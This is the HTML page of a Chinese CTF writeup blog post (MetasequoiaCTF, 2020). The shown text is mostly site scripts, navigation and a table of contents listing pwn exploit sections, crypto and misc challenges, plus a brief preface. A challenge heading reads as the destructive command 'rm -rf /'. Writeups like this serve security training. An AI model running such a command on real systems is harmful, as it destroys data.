<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>MetasequoiaCTF writeup | TaQini</title><meta name="description" content="MetasequoiaCTF writeup"><meta name="keywords" content="double free,dig,rabbit,二维码,RSA,RSA共模攻击,smali,fastbin,nop sled,无符号整数,shell"><meta name="author" content="TaQini,742954809@qq.com"><meta name="copyright" content="TaQini"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="http://image.taqini.space/img/20200305122927.png"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><link rel="preconnect" href="https://hm.baidu.com"><link rel="preconnect" href="http://ta.qq.com"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="google-site-verification" content="-dhsoFQadgDKJR7BsB6bc1j5yfqjUpg_b-1pFjr7o3x"><meta name="baidu-site-verification" content="MmFa3MzTgG"><meta name="360-site-verification" content="fddfed369e9e91402671f846d08e64c7"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="MetasequoiaCTF writeup"><meta name="twitter:description" content="MetasequoiaCTF writeup"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221201016.png"><meta property="og:type" content="article"><meta property="og:title" content="MetasequoiaCTF writeup"><meta property="og:url" content="http://taqini.space/2020/02/21/MetasequoiaCTF-writeup/"><meta property="og:site_name" content="TaQini"><meta property="og:description" content="MetasequoiaCTF writeup"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/20200221201016.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = 'false'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="canonical" href="http://taqini.space/2020/02/21/MetasequoiaCTF-writeup/"><link rel="prev" title="Fastbin Double free 知识点总结" href="http://taqini.space/2020/02/22/Double-free/"><link rel="next" title="Pwn小技巧总结" href="http://taqini.space/2020/02/19/pwn-technique/"><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(adsbygoogle = window.adsbygoogle || []).push({
  google_ad_client: 'ca-pub-3600751152886041',
  enable_page_level_ads: 'true'
});</script><script>var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?303b8d57c50af6b9774ac6c5de30548b";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-159447434-1', 'auto');
ga('send', 'pageview');
</script><script src="http://tajs.qq.com/stats?sId=66525622" charset="UTF-8"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><!-- Matomo Image Tracker--><!--img(src='http://ma.taqini.space/matomo.php?idsite=1&rec=1' style='border:0' alt='')--><!-- End Matomo--><!-- Matomo--><script type="text/javascript">var _paq = window._paq || [];
/* tracker methods like "setCustomDimension" should be called before "trackPageView" */
_paq.push(['trackPageView']);
_paq.push(['enableLinkTracking']);
(function() {
var u="//ma.taqini.space/";
_paq.push(['setTrackerUrl', u+'matomo.php']);
_paq.push(['setSiteId', '1']);
var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'matomo.js'; s.parentNode.insertBefore(g,s);
})();</script><!-- End Matomo Code--><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容:${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"http://taqini.space/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: {"languages":{"author":"作者: TaQini","link":"链接: http://taqini.space/2020/02/21/MetasequoiaCTF-writeup/","source":"来源: TaQini","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: {"bookmark":{"title":"Snackbar.bookmark.title","message_prev":"按","message_next":"键将本页加入书签"},"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"top-center"},
  baiduPush: true,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.0"></head><body><canvas class="fireworks"></canvas><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">TaQini</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msgboard/"><i class="fa-fw fa fa-commenting"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-code" aria-hidden="true"></i><span> 更多</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About me</span></a></li><li><a class="site-page" href="http://ctf.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> CTFq平台</span></a></li><li><a class="site-page" href="http://note.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-book"></i><span> Pwn解题本</span></a></li><li><a class="site-page" href="/2020/02/22/index-of-pwn/"><i class="fa-fw fa fa-chain"></i><span> Pwn索引</span></a></li><li><a class="site-page" href="/piao"><i class="fa-fw fa fa-link"></i><span> 漂亮前端</span></a></li><li><a class="site-page" href="/mikutap"><i class="fa-fw fa fa-music"></i><span> MikuTap</span></a></li><li><a class="site-page" href="https://pusheen.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-star"></i><span> Pusheen</span></a></li><li><a class="site-page" href="/todo/"><i class="fa-fw fa fa-check-square"></i><span> TODO List</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-book" aria-hidden="true"></i><span> 书单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://yeasy.gitbooks.io/docker_practice" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Docker从入门到实践</span></a></li><li><a class="site-page" href="https://bingohuang.gitbooks.io/progit2/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Pro Git</span></a></li><li><a class="site-page" href="https://wiki.x10sec.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> CTF Wiki</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gears" aria-hidden="true"></i><span> 工具</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://git.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-git"></i><span> Gogs平台</span></a></li><li><a class="site-page" href="ftp://47.100.63.152" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud"></i><span> FTP服务器</span></a></li><li><a class="site-page" href="http://ma.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-bar-chart"></i><span> Matomo统计</span></a></li><li><a class="site-page" href="/tools/"><i class="fa-fw fa fa-gears"></i><span> 更多工具</span></a></li></ul></div></div></span><span class="pull_right" id="search_button"><a class="site-page social-icon search"><i class="fa fa-search fa-fw"></i><span> 搜索</span></a></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="http://image.taqini.space/img/owl.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">30</div></a></div></div><div class="mobile_data_item is-center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">91</div></a></div></div><div class="mobile_data_item is-center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">7</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/msgboard/"><i class="fa-fw fa fa-commenting"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-code" aria-hidden="true"></i><span> 更多</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About me</span></a></li><li><a class="site-page" href="http://ctf.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-flag"></i><span> CTFq平台</span></a></li><li><a class="site-page" href="http://note.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-book"></i><span> Pwn解题本</span></a></li><li><a class="site-page" href="/2020/02/22/index-of-pwn/"><i class="fa-fw fa fa-chain"></i><span> Pwn索引</span></a></li><li><a class="site-page" href="/piao"><i class="fa-fw fa fa-link"></i><span> 漂亮前端</span></a></li><li><a class="site-page" href="/mikutap"><i class="fa-fw fa fa-music"></i><span> MikuTap</span></a></li><li><a class="site-page" href="https://pusheen.com/" target="_blank" rel="noopener"><i class="fa-fw fa fa-star"></i><span> Pusheen</span></a></li><li><a class="site-page" href="/todo/"><i class="fa-fw fa fa-check-square"></i><span> TODO List</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-book" aria-hidden="true"></i><span> 书单</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="https://yeasy.gitbooks.io/docker_practice" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Docker从入门到实践</span></a></li><li><a class="site-page" href="https://bingohuang.gitbooks.io/progit2/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> Pro Git</span></a></li><li><a class="site-page" href="https://wiki.x10sec.org/" target="_blank" rel="noopener"><i class="fa-fw fa fa-hand-o-right"></i><span> CTF Wiki</span></a></li></ul></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-gears" aria-hidden="true"></i><span> 工具</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="http://git.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-git"></i><span> Gogs平台</span></a></li><li><a class="site-page" href="ftp://47.100.63.152" target="_blank" rel="noopener"><i class="fa-fw fa fa-cloud"></i><span> FTP服务器</span></a></li><li><a class="site-page" href="http://ma.taqini.space" target="_blank" rel="noopener"><i class="fa-fw fa fa-bar-chart"></i><span> Matomo统计</span></a></li><li><a class="site-page" href="/tools/"><i class="fa-fw fa fa-gears"></i><span> 更多工具</span></a></li></ul></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#前言"><span class="toc_mobile_items-text">前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Pwn"><span class="toc_mobile_items-text">Pwn</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Blacksmith"><span class="toc_mobile_items-text">Blacksmith</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#程序分析"><span class="toc_mobile_items-text">程序分析</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#exp"><span class="toc_mobile_items-text">exp</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Snow-Mountain"><span class="toc_mobile_items-text">Snow Mountain</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#exp-1"><span class="toc_mobile_items-text">exp</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Summoner"><span class="toc_mobile_items-text">Summoner</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#程序分析-1"><span class="toc_mobile_items-text">程序分析</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解题思路"><span class="toc_mobile_items-text">解题思路</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#exp-2"><span class="toc_mobile_items-text">exp</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#官方wp"><span class="toc_mobile_items-text">官方wp</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#demon-dragon"><span class="toc_mobile_items-text">demon_dragon</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#程序分析-2"><span class="toc_mobile_items-text">程序分析</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#exp-3"><span class="toc_mobile_items-text">exp</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Samsara"><span class="toc_mobile_items-text">Samsara</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#程序分析-3"><span class="toc_mobile_items-text">程序分析</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解题思路-1"><span class="toc_mobile_items-text">解题思路</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#exp-4"><span class="toc_mobile_items-text">exp</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#官方wp-1"><span class="toc_mobile_items-text">官方wp</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Re"><span class="toc_mobile_items-text">Re</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#CMCS"><span class="toc_mobile_items-text">CMCS</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#babysmali"><span class="toc_mobile_items-text">babysmali</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#smali-gt-dex"><span class="toc_mobile_items-text">smali-&gt;dex</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#dex-gt-jar"><span class="toc_mobile_items-text">dex-&gt;jar</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#jar-gt-java"><span class="toc_mobile_items-text">jar-&gt;java</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解密"><span class="toc_mobile_items-text">解密</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Prison"><span class="toc_mobile_items-text">Prison</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Crypto"><span class="toc_mobile_items-text">Crypto</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Ridicule"><span class="toc_mobile_items-text">Ridicule</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Ridicule-Revenge"><span class="toc_mobile_items-text">Ridicule_Revenge</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#加密"><span class="toc_mobile_items-text">加密</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#思路"><span class="toc_mobile_items-text">思路</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#解密-1"><span class="toc_mobile_items-text">解密</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Ridicule-Rerevengevenge-unsolved"><span class="toc_mobile_items-text">Ridicule_Rerevengevenge [unsolved]</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#直接贴出官方wp"><span class="toc_mobile_items-text">直接贴出官方wp</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#Misc"><span class="toc_mobile_items-text">Misc</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#CheckIn"><span class="toc_mobile_items-text">CheckIn</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Rabbit-Hole"><span class="toc_mobile_items-text">Rabbit Hole</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Dont-use-Mac-unsolved"><span class="toc_mobile_items-text">Dont use Mac [unsolved]</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#官方wp-2"><span class="toc_mobile_items-text">官方wp</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#复现"><span class="toc_mobile_items-text">复现</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#rm-rf"><span class="toc_mobile_items-text">rm -rf &#x2F;</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#非预期"><span class="toc_mobile_items-text">非预期</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#官方解"><span class="toc_mobile_items-text">官方解</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-1"><a class="toc_mobile_items-link" href="#end"><span class="toc_mobile_items-text">end</span></a></li></ol></div></div></div><div id="body-wrap"><div id="web_bg" data-type="color"></div><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Blacksmith"><span class="toc-text">Blacksmith</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析"><span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Snow-Mountain"><span class="toc-text">Snow Mountain</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-1"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Summoner"><span class="toc-text">Summoner</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析-1"><span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路"><span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-2"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#官方wp"><span class="toc-text">官方wp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#demon-dragon"><span class="toc-text">demon_dragon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析-2"><span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-3"><span class="toc-text">exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Samsara"><span class="toc-text">Samsara</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#程序分析-3"><span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解题思路-1"><span class="toc-text">解题思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp-4"><span class="toc-text">exp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#官方wp-1"><span class="toc-text">官方wp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Re"><span class="toc-text">Re</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CMCS"><span class="toc-text">CMCS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babysmali"><span class="toc-text">babysmali</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#smali-gt-dex"><span class="toc-text">smali-&gt;dex</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#dex-gt-jar"><span class="toc-text">dex-&gt;jar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jar-gt-java"><span class="toc-text">jar-&gt;java</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解密"><span class="toc-text">解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Prison"><span class="toc-text">Prison</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Ridicule"><span class="toc-text">Ridicule</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ridicule-Revenge"><span class="toc-text">Ridicule_Revenge</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#加密"><span class="toc-text">加密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#思路"><span class="toc-text">思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#解密-1"><span class="toc-text">解密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ridicule-Rerevengevenge-unsolved"><span class="toc-text">Ridicule_Rerevengevenge [unsolved]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#直接贴出官方wp"><span class="toc-text">直接贴出官方wp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CheckIn"><span class="toc-text">CheckIn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Rabbit-Hole"><span class="toc-text">Rabbit Hole</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Dont-use-Mac-unsolved"><span class="toc-text">Dont use Mac [unsolved]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#官方wp-2"><span class="toc-text">官方wp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rm-rf"><span class="toc-text">rm -rf &#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#非预期"><span class="toc-text">非预期</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#官方解"><span class="toc-text">官方解</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#end"><span class="toc-text">end</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/TaQini/CDN@master/img/ea6503c45cfe7010dd038787933e588c.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">MetasequoiaCTF writeup</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2020-02-21<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2020-03-26</time><span class="post-meta__separator">|</span><span><i class="fa fa-inbox post-meta__icon fa-fw" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/CTF/">CTF</a></span><div class="post-meta-wordcount"><i class="fa fa-file-word-o post-meta__icon fa-fw" aria-hidden="true"></i><span>字数总计:</span><span class="word-count">6k</span><span class="post-meta__separator">|</span><i class="fa fa-clock-o post-meta__icon fa-fw" aria-hidden="true"></i><span>阅读时长: 28 分钟</span><div class="post-meta-pv-cv"><span class="post-meta__separator">|</span><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>不知道是什么学校办的CTF比赛，从<a href="https://imagin.vip/" target="_blank" rel="noopener">imagin</a>师傅那里听说的，比赛时间是2月20日13:00到2月21日17:00，持续1天零4个小时，题目总体来说难度不大，适合练习，平台提供容器化专属题目环境，这点很赞。</p>
